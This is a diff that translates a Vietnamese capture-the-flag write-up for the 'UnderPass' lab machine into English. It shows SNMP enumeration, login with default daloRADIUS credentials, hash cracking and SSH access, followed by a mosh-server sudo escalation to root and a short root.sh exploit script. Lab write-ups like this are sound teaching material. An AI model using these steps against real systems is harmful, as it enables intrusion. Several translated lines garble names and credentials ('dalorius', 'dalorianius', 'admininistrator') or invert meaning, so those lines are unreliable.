@@ -28,10 +28,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 16.09 seconds
 ```
 
-Kết quả từ `nmap` quét TCP cho tôi thấy rằng cổng 80 chỉ thông báo rằng máy này dùng `Apache` và hoạt động bình thường, nên không có bề mặt tấn công rõ ràng, hãy thử đến với UDP.
+The results from `nmap` scanning TCP show me that port 80 just says this machine is using `Apache` and is working fine, so there is no obvious attack surface, let's try UDP.
 #### <span style="color: #ebe134;">UDP</span>
 
-Có thể thấy rằng đây là `snmp` đang chạy ở cổng UDP 161 và  chúng ta có thông tin rằng máy chủ có lẽ đang chạy [Daloradius][https://github.com/lirantal/daloradius] - một giao diện quản trị web dành cho FreeRADIUS.
+We can see that this is `snmp` running on UDP port 161 and we have information that the server is probably running [Daloradius][https://github.com/lirantal/daloradius] - a web administration interface for FreeRADIUS.
 
 ```zsh
 ❯ sudo nmap -sCV -sU -T4 --min-rate 3000 -p 53,67,123,161 -oA ./nmap/underpass_udp 10.129.41.174
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
 ```
 ### <span style="color: #3498eb;">SNMP</span>
 
-Tôi sẽ thêm dòng này vào `/etc/hosts`thay vì tôi phải nhớ địa chỉ ip của nó.
+I would add this line to `/etc/hosts` instead I have to remember its ip address.
 
 ```zsh
 ❯ echo 10.129.41.174 underpass.htb | sudo tee -a /etc/hosts
@@ -71,7 +71,7 @@ Sau đó đi bộ với `SNMP`.
 snmpwalk -c public -v1 underpass.htb
 ```
 
-Kết quả như nhau, khuyến khích nên dùng cách này vì `snmpbulkwalk` có hiệu suất tốt hơn.
+Same result, recommended to use this method because `snmpbulkwalk` has better performance.
 
 ```zsh
 ❯ snmpbulkwalk -c public -v2c underpass.htb
@@ -124,12 +124,12 @@ iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
 iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
 ```
 
-Không có gì đặc biệt cả, ngoại trừ việc nhấn mạnh lại rằng nó đang chạy `daloradius` cùng với một địa chỉ email `steve@underpass.htb`
+Nothing special, except to re-emphasize that it's running `dalorius` with an email address `steve@underpass.htb`
 ### <span style="color: #3498eb;">HTTP 80</span>
 
 #### <span style="color: #ebe134;">FUZZING</span>
 
-Tôi cố chấp thử xem liệu `Gobuster` cho ra kết quả mới mẻ không nhưng không có gì ở đây.
+I stubbornly tried to see if `Gobuster` would produce any new results but nothing here.
 
 ```zsh
 ❯ gobuster dir -u http://10.129.41.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --timeout=5s -t 50
@@ -137,27 +137,27 @@ Tôi cố chấp thử xem liệu `Gobuster` cho ra kết quả mới mẻ khôn
 
 #### <span style="color: #ebe134;">SITE</span>
 
-Nhìn lại kết quả của `nmap` với UDP,  tôi đã cố gắng truy cập vào `http://underpass.htb/daloradius/`
+Looking back at the results of `nmap` with UDP, I tried accessing `http://underpass.htb/dalorianius/`
 
-![1.png](UnderPass/images/1.png)
+![1.png](./images/1.png)
 
-Tại github chính thức của `daloradius`, bạn sẽ thấy cấu trúc đường dẫn `app/operators/login.php`
-Ồ đây là một trang đăng nhập có thể truy cập được, họ vẫn giữ đường dẫn mặc định.
+On the official github of `dalorius`, you will see the path structure `app/operators/login.php`
+Oh this is an accessible login page, they still keep the default path.
 
-![2.png](UnderPass/images/2.png)
+![2.png](./images/2.png)
 
-Có thể đăng nhập với tài khoản và mật khẩu mặc định `admministrator:radius`
+You can log in with the default account and password `admininistrator:radius`
 
-![3.png](UnderPass/images/3.png)
+![3.png](./images/3.png)
 
 ## <span style="color: red; font-weight: bold;">Shell as</span> **`svcMosh`**
 ### <span style="color: #3498eb;">Crack the password</span>
 
-Ở mục danh sách người dùng, bạn có thể thấy được người dùng `svcMosh` và hàm băm mật khẩu.
+In the user list section you can see the user `svcMosh` and the password hash.
 
-![4.png](UnderPass/images/4.png)
+![4.png](./images/4.png)
 
-Bẻ khóa mật khẩu với `hashcat`:
+Cracking password with `hashcat`:
 
 ```zsh
 ❯ echo "412DD4759978ACFCC81DEAB01B382403" > hash
@@ -167,7 +167,7 @@ Bẻ khóa mật khẩu với `hashcat`:
 ```
 ### <span style="color: #3498eb;">SSH</span>
 
-Đăng nhập với ssh thông qua người dùng `svcMosh:underwaterfriends`
+Login with ssh via user `svcMosh:underwaterfriends`
 
 ```zsh
 ❯ ssh svcMosh@underpass.htb
@@ -177,9 +177,9 @@ svcMosh@underpass:~$ cat user.txt
 ```
 ## <span style="color: red; font-weight: bold;">Shell as root</span>
 
-### <span style="color: #3498eb;">Liệt kê quyền sudo</span>
+### <span style="color: #3498eb;">List sudo permissions</span>
 
-Có thể chạy  `/usr/bin/mosh-server` không mật khẩu với `sudo`:
+It is possible to run `/usr/bin/mosh-server` without a password with `sudo`:
 
 ```zsh
 svcMosh@underpass:~$ sudo -l
@@ -190,10 +190,10 @@ User svcMosh may run the following commands on localhost:
     (ALL) NOPASSWD: /usr/bin/mosh-server
 ```
 
-Đây chắc chắn là phương thức khai thác để nắm quyền `root`.
+This is definitely an exploit to gain `root` privileges.
 ### <span style="color: #3498eb;">Check Mosh</span>
 
-#### <span style="color: #ebe134;">Phân tích</span>
+#### <span style="color: #ebe134;">Analysis</span>
 
 ```zsh
 svcMosh@underpass:~$ sudo /usr/bin/mosh-server
@@ -211,31 +211,31 @@ There is NO WARRANTY, to the extent permitted by law.
 
 ```
 
-Đầu ra:
+Output:
 
 `MOSH CONNECT 60001 Ris0qk5c5Skk4FIjZmWZFw`:
 
-`MOSH CONNECT` cho biết một phiên `Mosh` đang bắt đầu.
-`60001` có lẽ là cổng UDP mà máy chủ đang lắng nghe kết nối từ khách hàng.    
-`Ris0qk5c5Skk4FIjZmWZFw` chắc chắn là một mã định danh phiên, giúp nhận dạng duy nhất phiên Mosh này.
+`MOSH CONNECT` indicates that a `Mosh` session is starting.
+`60001` is probably the UDP port the server is listening for connections from clients on.
+`Ris0qk5c5Skk4FIjZmWZFw` is definitely a session identifier, which uniquely identifies this Mosh session.
 
-Kiểm tra các tùy chọn của `mosh-server`:
+Check the `mosh-server` options:
 
 ```zsh
 svcMosh@underpass:~$ sudo /usr/bin/mosh-server --help
 Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
 ```
 
-Kiểm tra mã số tiến trình của mosh-server.
+Check the mosh-server process ID.
 
-![UnderPass/images/5.png](UnderPass/images/5.png)
+![./images/5.png](./images/5.png)
 
-#### <span style="color: #ebe134;">Khai thác</span>
+#### <span style="color: #ebe134;">Exploit</span>
 
-Tức là `Mosh` sẽ tạo một phiên lắng nghe và sẵn sàng kết nối nếu được yêu cầu. Mở ra một shell với người dùng đó.
-Vấn đề ở đây là khi ta kiểm tra mã tiến trình của `mosh`, nó đang được chạy bởi `root`. Có nghĩa là ta sẽ kết nối trực tiếp đến phiên này thông qua mã định danh và cổng kết nối, lúc này, ta sẽ có shell của người dùng `root`.
+That means `mosh` will create a listening session and be ready to connect if requested. Open a shell with that user.
+The problem here is that when we check the process ID of `mosh`, it is being run by `root`. This means we will connect directly to this session via the ID and connection port, at this point, we will have the shell of the user `root`.
 
-Tôi sẽ sử dụng `mosh-client`, trước hết, cần tìm hiểu câu lệnh đầy đủ:
+I will use `mosh-client`, first, let's understand the full command:
 
 ```zsh
 svcMosh@underpass:~$ mosh-client -# "/bin/bash" 127.0.0.1 60001
@@ -270,14 +270,14 @@ root@underpass:~# cat /root/root.txt
 root@underpass:~# 
 ```
 
-Để tiện hơn, tôi sẽ tạo một mã khai thác tự động, bạn chỉ cần coppy nó vào `root.sh` sau đó:
+For convenience, I will create an automatic exploit, you just need to copy it into `root.sh` then:
 
 ```zsh
 chmod +x root.sh
 ./root.sh
 ```
 
-Mã khai thác cho `root.sh`:
+Exploit script for `root.sh`:
 
 ```bash
 #!/bin/bash
@@ -289,4 +289,4 @@ export MOSH_KEY=$key
 mosh-client -# "/bin/bash" 127.0.0.1 $port
 ```
 
-![UnderPass/images/6.png](UnderPass/images/6.png)
+![./images/6.png](./images/6.png)
